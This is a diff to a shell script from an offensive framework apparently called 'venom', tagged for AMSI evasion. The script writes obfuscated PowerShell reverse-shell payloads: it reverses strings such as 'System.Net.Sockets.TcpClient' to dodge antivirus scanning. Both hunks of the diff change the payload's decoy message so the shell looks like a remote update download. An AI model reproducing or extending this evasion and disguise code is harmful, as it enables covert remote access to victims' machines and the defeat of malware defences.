@@ -12059,7 +12059,7 @@ echo "Framework: venom v1.0.16 (amsi evasion)" >> $IPATH/output/$NaM.ps1
 echo "Original shell: @ZHacker13" >> $IPATH/output/$NaM.ps1
 echo "#>" >> $IPATH/output/$NaM.ps1
 echo "" >> $IPATH/output/$NaM.ps1
-echo "write-Host \"Searching KB4524147 Index For Available Updates .. ..\" -ForeGroundColor green -BackGroundColor black;" >> $IPATH/output/$NaM.ps1
+echo "write-Host \"Connecting to Remote Server To Download Updates ..\";" >> $IPATH/output/$NaM.ps1
 echo "\$MethodInvocation = \"gnidocnEiicsA.txeT.metsyS\";\$Constructor = \$MethodInvocation.ToCharArray();[Array]::Reverse(\$Constructor);" >> $IPATH/output/$NaM.ps1
 echo "\$NewObjectCommand = (\$Constructor -Join '');\$icmpv6 = \"StreamWriter\";\$assembly = \"tneilCpcT.stekcoS.teN\";" >> $IPATH/output/$NaM.ps1
 echo "\$CmdCharArray = \$assembly.ToCharArray();[Array]::Reverse(\$CmdCharArray);\$PSArgException = (\$CmdCharArray -Join '');" >> $IPATH/output/$NaM.ps1
@@ -12217,7 +12217,7 @@ echo "Framework: venom v1.0.16 (amsi evasion)" >> $IPATH/output/$NaM.ps1
 echo "Original shell: @int0x33" >> $IPATH/output/$NaM.ps1
 echo "#>" >> $IPATH/output/$NaM.ps1
 echo "" >> $IPATH/output/$NaM.ps1
-echo "write-Host \"Searching KB4524147 Index For Available Updates ..\" -ForeGroundColor green -BackGroundColor black;" >> $IPATH/output/$NaM.ps1
+echo "write-Host \"Connecting to Remote Server To Download Updates ..\";" >> $IPATH/output/$NaM.ps1
 echo "\$MethodInvocation = \"tneilCpcT.stekcoS.teN\";\$Constructor = \$MethodInvocation.ToCharArray();[Array]::Reverse(\$Constructor);" >> $IPATH/output/$NaM.ps1
 echo "\$NewObjectCommand = (\$Constructor -Join '');\$assembly = \"gnidocnEiicsA.txeT.metsyS\";\$CmdCharArray = \$assembly.ToCharArray();" >> $IPATH/output/$NaM.ps1
 echo "[Array]::Reverse(\$CmdCharArray);\$PSArgException = (\$CmdCharArray -Join '');" >> $IPATH/output/$NaM.ps1
